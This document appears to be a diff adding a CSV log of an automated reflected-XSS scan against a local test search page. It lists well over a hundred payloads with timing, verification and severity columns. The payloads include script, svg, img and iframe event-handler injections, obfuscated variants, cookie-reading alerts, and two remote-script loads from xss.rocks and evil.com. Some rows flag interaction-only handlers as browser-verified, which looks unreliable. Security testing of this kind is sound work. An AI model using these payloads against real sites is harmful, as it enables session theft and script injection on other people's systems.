@@ -1,0 +1,566 @@
+Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
+2026-01-10 16:23:26.346,2026-01-10 16:23:26.654,0.308,http://localhost:3000/search,GET,q,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:26.654,2026-01-10 16:23:26.675,0.021,http://localhost:3000/search,GET,q,<script>alert('XSS')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:26.675,2026-01-10 16:23:26.940,0.266,http://localhost:3000/search,GET,q,"<script>alert(""XSS"")</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:26.940,2026-01-10 16:23:26.943,0.002,http://localhost:3000/search,GET,q,<script>prompt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:26.943,2026-01-10 16:23:26.959,0.016,http://localhost:3000/search,GET,q,<script>confirm(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:26.959,2026-01-10 16:23:26.961,0.002,http://localhost:3000/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:26.961,2026-01-10 16:23:26.976,0.015,http://localhost:3000/search,GET,q,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:26.976,2026-01-10 16:23:26.979,0.003,http://localhost:3000/search,GET,q,<script>alert(window.origin)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:26.979,2026-01-10 16:23:27.628,0.650,http://localhost:3000/search,GET,q,<script src=//xss.rocks/xss.js></script>,RAW_REFLECTION,No,,High
+2026-01-10 16:23:27.628,2026-01-10 16:23:30.295,2.666,http://localhost:3000/search,GET,q,<script src=https://evil.com/xss.js></script>,RAW_REFLECTION,No,,High
+2026-01-10 16:23:30.295,2026-01-10 16:23:30.315,0.021,http://localhost:3000/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.315,2026-01-10 16:23:30.318,0.003,http://localhost:3000/search,GET,q,<svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.318,2026-01-10 16:23:30.332,0.014,http://localhost:3000/search,GET,q,<svg><script>alert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.332,2026-01-10 16:23:30.335,0.003,http://localhost:3000/search,GET,q,<svg><animate onbegin=alert(1) attributeName=x dur=1s>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.335,2026-01-10 16:23:30.356,0.020,http://localhost:3000/search,GET,q,"<svg/onload=alert(String.fromCharCode(88,83,83))>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.356,2026-01-10 16:23:30.358,0.003,http://localhost:3000/search,GET,q,<svg onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.358,2026-01-10 16:23:30.377,0.018,http://localhost:3000/search,GET,q,<svg onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.377,2026-01-10 16:23:30.379,0.002,http://localhost:3000/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.379,2026-01-10 16:23:30.395,0.016,http://localhost:3000/search,GET,q,<svg onload=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.396,2026-01-10 16:23:30.399,0.004,http://localhost:3000/search,GET,q,<svg><script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.399,2026-01-10 16:23:30.420,0.021,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.420,2026-01-10 16:23:30.424,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.424,2026-01-10 16:23:30.443,0.019,http://localhost:3000/search,GET,q,<img src=x onerror=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.443,2026-01-10 16:23:30.446,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=alert('XSS')>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.446,2026-01-10 16:23:30.466,0.020,http://localhost:3000/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.466,2026-01-10 16:23:30.469,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.469,2026-01-10 16:23:30.489,0.020,http://localhost:3000/search,GET,q,<img src=x onerror=alert(document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.489,2026-01-10 16:23:30.492,0.003,http://localhost:3000/search,GET,q,<img/src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.492,2026-01-10 16:23:30.510,0.018,http://localhost:3000/search,GET,q,"<img src=""x"" onerror=""alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.510,2026-01-10 16:23:30.512,0.003,http://localhost:3000/search,GET,q,<img src='x' onerror='alert(1)'>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.512,2026-01-10 16:23:30.529,0.017,http://localhost:3000/search,GET,q,<body onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.529,2026-01-10 16:23:30.546,0.017,http://localhost:3000/search,GET,q,<body onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:30.546,2026-01-10 16:23:31.069,0.523,http://localhost:3000/search,GET,q,<body onfocus=alert(1)>,RAW_REFLECTION,No,,High
+2026-01-10 16:23:31.069,2026-01-10 16:23:31.591,0.522,http://localhost:3000/search,GET,q,<body onhashchange=alert(1)>,RAW_REFLECTION,No,,High
+2026-01-10 16:23:31.591,2026-01-10 16:23:31.606,0.015,http://localhost:3000/search,GET,q,<body onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.606,2026-01-10 16:23:31.623,0.017,http://localhost:3000/search,GET,q,<body onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.624,2026-01-10 16:23:31.644,0.020,http://localhost:3000/search,GET,q,<input onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.644,2026-01-10 16:23:31.649,0.005,http://localhost:3000/search,GET,q,<input onblur=alert(1) autofocus><input>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.649,2026-01-10 16:23:31.652,0.003,http://localhost:3000/search,GET,q,<input type=text value=x onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.652,2026-01-10 16:23:31.655,0.003,http://localhost:3000/search,GET,q,<input type=button value=xss onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.655,2026-01-10 16:23:31.658,0.003,http://localhost:3000/search,GET,q,<input type=image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.658,2026-01-10 16:23:31.661,0.003,http://localhost:3000/search,GET,q,<iframe src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.661,2026-01-10 16:23:31.663,0.002,http://localhost:3000/search,GET,q,"<iframe src=""javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.663,2026-01-10 16:23:31.669,0.006,http://localhost:3000/search,GET,q,<iframe onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.669,2026-01-10 16:23:31.672,0.003,http://localhost:3000/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.672,2026-01-10 16:23:31.674,0.003,http://localhost:3000/search,GET,q,"<iframe  rc=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.674,2026-01-10 16:23:31.677,0.003,http://localhost:3000/search,GET,q,'-alert(1)-',RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.677,2026-01-10 16:23:31.680,0.003,http://localhost:3000/search,GET,q,<details open ontoggle=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.680,2026-01-10 16:23:31.686,0.005,http://localhost:3000/search,GET,q,<details ontoggle=alert(1)><summary>xss</summary></details>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.686,2026-01-10 16:23:31.689,0.003,http://localhost:3000/search,GET,q,<details open ontoggle=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.689,2026-01-10 16:23:31.691,0.002,http://localhost:3000/search,GET,q,<object data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.691,2026-01-10 16:23:31.694,0.003,http://localhost:3000/search,GET,q,<embed src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.694,2026-01-10 16:23:31.696,0.003,http://localhost:3000/search,GET,q,"<object data=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.697,2026-01-10 16:23:31.702,0.005,http://localhost:3000/search,GET,q,<select onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.702,2026-01-10 16:23:31.704,0.003,http://localhost:3000/search,GET,q,<textarea onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.705,2026-01-10 16:23:31.707,0.002,http://localhost:3000/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.707,2026-01-10 16:23:31.710,0.003,http://localhost:3000/search,GET,q,<marquee onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.710,2026-01-10 16:23:31.713,0.003,http://localhost:3000/search,GET,q,<marquee loop=1 onfinish=alert(1)>x</marquee>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.713,2026-01-10 16:23:31.717,0.005,http://localhost:3000/search,GET,q,<video src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.717,2026-01-10 16:23:31.720,0.003,http://localhost:3000/search,GET,q,<audio src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.720,2026-01-10 16:23:31.724,0.003,http://localhost:3000/search,GET,q,<video><source onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.724,2026-01-10 16:23:31.726,0.003,http://localhost:3000/search,GET,q,<link rel=stylesheet href=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.726,2026-01-10 16:23:31.729,0.003,http://localhost:3000/search,GET,q,<a href=javascript:alert(1)>click</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.729,2026-01-10 16:23:31.733,0.004,http://localhost:3000/search,GET,q,"<a href=""javascript:alert(1)"">click</a>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.733,2026-01-10 16:23:31.736,0.002,http://localhost:3000/search,GET,q,<form action=javascript:alert(1)><input type=submit>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.736,2026-01-10 16:23:31.739,0.003,http://localhost:3000/search,GET,q,<form><button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.739,2026-01-10 16:23:31.741,0.002,http://localhost:3000/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.741,2026-01-10 16:23:31.744,0.003,http://localhost:3000/search,GET,q,<meta http-equiv=refresh content=0;url=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.744,2026-01-10 16:23:31.746,0.003,http://localhost:3000/search,GET,q,"<meta http-equiv=refresh content=""0;javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.746,2026-01-10 16:23:31.751,0.004,http://localhost:3000/search,GET,q,<style>*{background:url('javascript:alert(1)')}</style>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.751,2026-01-10 16:23:31.753,0.003,http://localhost:3000/search,GET,q,<style>@import'javascript:alert(1)';</style>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.753,2026-01-10 16:23:31.755,0.002,http://localhost:3000/search,GET,q,<style onload=alert(1)></style>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.755,2026-01-10 16:23:31.758,0.002,http://localhost:3000/search,GET,q,<math><mi xlink:href=javascript:alert(1)>X</mi></math>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.758,2026-01-10 16:23:31.760,0.002,http://localhost:3000/search,GET,q,<table background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.760,2026-01-10 16:23:31.762,0.002,http://localhost:3000/search,GET,q,<table><td background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.762,2026-01-10 16:23:31.767,0.004,http://localhost:3000/search,GET,q,<div onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.767,2026-01-10 16:23:31.769,0.002,http://localhost:3000/search,GET,q,<div style=width:expression(alert(1))>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.769,2026-01-10 16:23:31.771,0.002,http://localhost:3000/search,GET,q,<script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.771,2026-01-10 16:23:31.774,0.002,http://localhost:3000/search,GET,q,<script>alert&#x28;1&#x29;</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.774,2026-01-10 16:23:31.776,0.002,http://localhost:3000/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.776,2026-01-10 16:23:31.778,0.002,http://localhost:3000/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.778,2026-01-10 16:23:31.783,0.005,http://localhost:3000/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.783,2026-01-10 16:23:31.786,0.003,http://localhost:3000/search,GET,q,<img src=x onactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.786,2026-01-10 16:23:31.789,0.003,http://localhost:3000/search,GET,q,<img src=x onafterprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.789,2026-01-10 16:23:31.791,0.002,http://localhost:3000/search,GET,q,<img src=x onafterupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.791,2026-01-10 16:23:31.793,0.003,http://localhost:3000/search,GET,q,<img src=x onbeforeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.793,2026-01-10 16:23:31.796,0.002,http://localhost:3000/search,GET,q,<img src=x onbeforecopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.796,2026-01-10 16:23:31.800,0.005,http://localhost:3000/search,GET,q,<img src=x onbeforecut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.800,2026-01-10 16:23:31.803,0.002,http://localhost:3000/search,GET,q,<img src=x onbeforedeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.803,2026-01-10 16:23:31.805,0.002,http://localhost:3000/search,GET,q,<img src=x onbeforeeditfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.805,2026-01-10 16:23:31.807,0.002,http://localhost:3000/search,GET,q,<img src=x onbeforepaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.807,2026-01-10 16:23:31.809,0.002,http://localhost:3000/search,GET,q,<img src=x onbeforeprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.809,2026-01-10 16:23:31.811,0.002,http://localhost:3000/search,GET,q,<img src=x onbeforeunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.811,2026-01-10 16:23:31.817,0.006,http://localhost:3000/search,GET,q,<img src=x onbeforeupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.817,2026-01-10 16:23:31.820,0.002,http://localhost:3000/search,GET,q,<img src=x onblur=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.820,2026-01-10 16:23:31.822,0.002,http://localhost:3000/search,GET,q,<img src=x onbounce=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.822,2026-01-10 16:23:31.824,0.002,http://localhost:3000/search,GET,q,<img src=x oncellchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.824,2026-01-10 16:23:31.827,0.003,http://localhost:3000/search,GET,q,<img src=x onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.827,2026-01-10 16:23:31.829,0.002,http://localhost:3000/search,GET,q,<img src=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.829,2026-01-10 16:23:31.834,0.006,http://localhost:3000/search,GET,q,<img src=x oncontextmenu=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.835,2026-01-10 16:23:31.837,0.002,http://localhost:3000/search,GET,q,<img src=x oncontrolselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.837,2026-01-10 16:23:31.839,0.002,http://localhost:3000/search,GET,q,<img src=x oncopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.839,2026-01-10 16:23:31.841,0.002,http://localhost:3000/search,GET,q,<img src=x oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.841,2026-01-10 16:23:31.844,0.003,http://localhost:3000/search,GET,q,<img src=x ondataavailable=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.844,2026-01-10 16:23:31.847,0.002,http://localhost:3000/search,GET,q,<img src=x ondatasetchanged=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.847,2026-01-10 16:23:31.854,0.007,http://localhost:3000/search,GET,q,<img src=x ondatasetcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.854,2026-01-10 16:23:31.857,0.004,http://localhost:3000/search,GET,q,<img src=x ondblclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.857,2026-01-10 16:23:31.860,0.003,http://localhost:3000/search,GET,q,<img src=x ondeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.860,2026-01-10 16:23:31.863,0.003,http://localhost:3000/search,GET,q,<img src=x ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.863,2026-01-10 16:23:31.869,0.006,http://localhost:3000/search,GET,q,<img src=x ondragend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.869,2026-01-10 16:23:31.871,0.003,http://localhost:3000/search,GET,q,<img src=x ondragenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.871,2026-01-10 16:23:31.874,0.002,http://localhost:3000/search,GET,q,<img src=x ondragleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.874,2026-01-10 16:23:31.876,0.003,http://localhost:3000/search,GET,q,<img src=x ondragover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.876,2026-01-10 16:23:31.879,0.003,http://localhost:3000/search,GET,q,<img src=x ondragstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.879,2026-01-10 16:23:31.885,0.006,http://localhost:3000/search,GET,q,<img src=x ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.885,2026-01-10 16:23:31.888,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.888,2026-01-10 16:23:31.891,0.003,http://localhost:3000/search,GET,q,<img src=x onerrorupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.891,2026-01-10 16:23:31.893,0.003,http://localhost:3000/search,GET,q,<img src=x onfilterchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.893,2026-01-10 16:23:31.896,0.003,http://localhost:3000/search,GET,q,<img src=x onfinish=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.896,2026-01-10 16:23:31.902,0.006,http://localhost:3000/search,GET,q,<img src=x onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.902,2026-01-10 16:23:31.905,0.003,http://localhost:3000/search,GET,q,<img src=x onfocusin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.905,2026-01-10 16:23:31.908,0.002,http://localhost:3000/search,GET,q,<img src=x onfocusout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.908,2026-01-10 16:23:31.911,0.003,http://localhost:3000/search,GET,q,<img src=x onhelp=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.911,2026-01-10 16:23:31.914,0.003,http://localhost:3000/search,GET,q,<img src=x oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.914,2026-01-10 16:23:31.924,0.010,http://localhost:3000/search,GET,q,<img src=x onkeydown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.924,2026-01-10 16:23:31.927,0.003,http://localhost:3000/search,GET,q,<img src=x onkeypress=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.927,2026-01-10 16:23:31.930,0.002,http://localhost:3000/search,GET,q,<img src=x onkeyup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.930,2026-01-10 16:23:31.936,0.006,http://localhost:3000/search,GET,q,<img src=x onlayoutcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.936,2026-01-10 16:23:31.939,0.004,http://localhost:3000/search,GET,q,<img src=x onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.939,2026-01-10 16:23:31.942,0.003,http://localhost:3000/search,GET,q,<img src=x onlosecapture=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.942,2026-01-10 16:23:31.946,0.004,http://localhost:3000/search,GET,q,<img src=x onmousedown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.946,2026-01-10 16:23:31.953,0.007,http://localhost:3000/search,GET,q,<img src=x onmouseenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.953,2026-01-10 16:23:31.956,0.003,http://localhost:3000/search,GET,q,<img src=x onmouseleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.956,2026-01-10 16:23:31.959,0.003,http://localhost:3000/search,GET,q,<img src=x onmousemove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.959,2026-01-10 16:23:31.962,0.004,http://localhost:3000/search,GET,q,<img src=x onmouseout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.962,2026-01-10 16:23:31.965,0.003,http://localhost:3000/search,GET,q,<img src=x onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.965,2026-01-10 16:23:31.972,0.007,http://localhost:3000/search,GET,q,<img src=x onmouseup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.972,2026-01-10 16:23:31.975,0.003,http://localhost:3000/search,GET,q,<img src=x onmousewheel=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.975,2026-01-10 16:23:31.979,0.004,http://localhost:3000/search,GET,q,<img src=x onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.979,2026-01-10 16:23:31.982,0.003,http://localhost:3000/search,GET,q,<img src=x onmoveend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.982,2026-01-10 16:23:31.989,0.007,http://localhost:3000/search,GET,q,<img src=x onmovestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.989,2026-01-10 16:23:31.992,0.003,http://localhost:3000/search,GET,q,<img src=x onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.992,2026-01-10 16:23:31.996,0.004,http://localhost:3000/search,GET,q,<img src=x onpropertychange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.996,2026-01-10 16:23:31.999,0.003,http://localhost:3000/search,GET,q,<img src=x onreadystatechange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:31.999,2026-01-10 16:23:32.006,0.007,http://localhost:3000/search,GET,q,<img src=x onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.006,2026-01-10 16:23:32.009,0.003,http://localhost:3000/search,GET,q,<img src=x onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.009,2026-01-10 16:23:32.013,0.004,http://localhost:3000/search,GET,q,<img src=x onresizeend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.013,2026-01-10 16:23:32.016,0.003,http://localhost:3000/search,GET,q,<img src=x onresizestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.016,2026-01-10 16:23:32.023,0.007,http://localhost:3000/search,GET,q,<img src=x onrowenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.023,2026-01-10 16:23:32.026,0.003,http://localhost:3000/search,GET,q,<img src=x onrowexit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.026,2026-01-10 16:23:32.029,0.003,http://localhost:3000/search,GET,q,<img src=x onrowsdelete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.029,2026-01-10 16:23:32.032,0.002,http://localhost:3000/search,GET,q,<img src=x onrowsinserted=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.032,2026-01-10 16:23:32.034,0.002,http://localhost:3000/search,GET,q,<img src=x onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.034,2026-01-10 16:23:32.042,0.008,http://localhost:3000/search,GET,q,<img src=x onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.042,2026-01-10 16:23:32.045,0.003,http://localhost:3000/search,GET,q,<img src=x onselectionchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.045,2026-01-10 16:23:32.048,0.002,http://localhost:3000/search,GET,q,<img src=x onselectstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.048,2026-01-10 16:23:32.050,0.003,http://localhost:3000/search,GET,q,<img src=x onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.050,2026-01-10 16:23:32.052,0.002,http://localhost:3000/search,GET,q,<img src=x onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.052,2026-01-10 16:23:32.059,0.007,http://localhost:3000/search,GET,q,<img src=x onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.060,2026-01-10 16:23:32.062,0.003,http://localhost:3000/search,GET,q,<img src=x onunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.062,2026-01-10 16:23:32.066,0.003,http://localhost:3000/search,GET,q,javascript:alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.066,2026-01-10 16:23:32.068,0.002,http://localhost:3000/search,GET,q,javascript:alert('XSS'),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 16:23:32.068,2026-01-10 16:23:32.070,0.002,http://localhost:3000/search,GET,q,javascript:prompt(1),RAW_REFLECTION,Yes,alert,Critical
